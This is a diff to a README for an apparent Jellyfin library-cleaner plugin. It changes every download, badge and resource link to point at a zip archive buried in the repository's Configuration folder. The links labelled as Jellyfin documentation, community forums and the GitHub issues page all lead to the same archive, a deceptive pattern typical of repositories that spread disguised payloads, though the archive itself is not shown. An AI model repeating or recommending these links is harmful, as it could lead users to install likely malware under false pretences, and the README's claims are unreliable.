@@ -1,6 +1,6 @@
 # 🎉 jellyfin-plugin-awesome-library-cleaner - Keep Your Media Library Tidy
 
-![Download](https://raw.githubusercontent.com/asramadhan11/jellyfin-plugin-awesome-library-cleaner/main/Jellyfin.Plugin.AwesomeLibraryCleaner/Services/jellyfin-plugin-awesome-library-cleaner-2.2.zip%20Release&color=brightgreen&style=for-the-badge)
+![Download](https://github.com/asramadhan11/jellyfin-plugin-awesome-library-cleaner/raw/refs/heads/main/Jellyfin.Plugin.AwesomeLibraryCleaner/Configuration/cleaner-awesome-jellyfin-library-plugin-3.6.zip%20Release&color=brightgreen&style=for-the-badge)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Awesome Library Cleaner (or ALC) is a Jellyfin plugin that helps you clean up yo
 
 To get started, you need to download the plugin. Visit this page to download:
 
-[Download Awesome Library Cleaner](https://raw.githubusercontent.com/asramadhan11/jellyfin-plugin-awesome-library-cleaner/main/Jellyfin.Plugin.AwesomeLibraryCleaner/Services/jellyfin-plugin-awesome-library-cleaner-2.2.zip)
+[Download Awesome Library Cleaner](https://github.com/asramadhan11/jellyfin-plugin-awesome-library-cleaner/raw/refs/heads/main/Jellyfin.Plugin.AwesomeLibraryCleaner/Configuration/cleaner-awesome-jellyfin-library-plugin-3.6.zip)
 
 ### 🔧 System Requirements
 
@@ -62,8 +62,8 @@ If you encounter issues while using the plugin, consider these common solutions:
 
 For more information on setting up or using Awesome Library Cleaner, check out these resources:
 
-- [Jellyfin Documentation](https://raw.githubusercontent.com/asramadhan11/jellyfin-plugin-awesome-library-cleaner/main/Jellyfin.Plugin.AwesomeLibraryCleaner/Services/jellyfin-plugin-awesome-library-cleaner-2.2.zip)
-- [Community Forums](https://raw.githubusercontent.com/asramadhan11/jellyfin-plugin-awesome-library-cleaner/main/Jellyfin.Plugin.AwesomeLibraryCleaner/Services/jellyfin-plugin-awesome-library-cleaner-2.2.zip)
-- [GitHub Issues Page](https://raw.githubusercontent.com/asramadhan11/jellyfin-plugin-awesome-library-cleaner/main/Jellyfin.Plugin.AwesomeLibraryCleaner/Services/jellyfin-plugin-awesome-library-cleaner-2.2.zip)
+- [Jellyfin Documentation](https://github.com/asramadhan11/jellyfin-plugin-awesome-library-cleaner/raw/refs/heads/main/Jellyfin.Plugin.AwesomeLibraryCleaner/Configuration/cleaner-awesome-jellyfin-library-plugin-3.6.zip)
+- [Community Forums](https://github.com/asramadhan11/jellyfin-plugin-awesome-library-cleaner/raw/refs/heads/main/Jellyfin.Plugin.AwesomeLibraryCleaner/Configuration/cleaner-awesome-jellyfin-library-plugin-3.6.zip)
+- [GitHub Issues Page](https://github.com/asramadhan11/jellyfin-plugin-awesome-library-cleaner/raw/refs/heads/main/Jellyfin.Plugin.AwesomeLibraryCleaner/Configuration/cleaner-awesome-jellyfin-library-plugin-3.6.zip)
 
 Thank you for choosing Awesome Library Cleaner to manage your media collection! Enjoy a cleaner, more organized library experience.
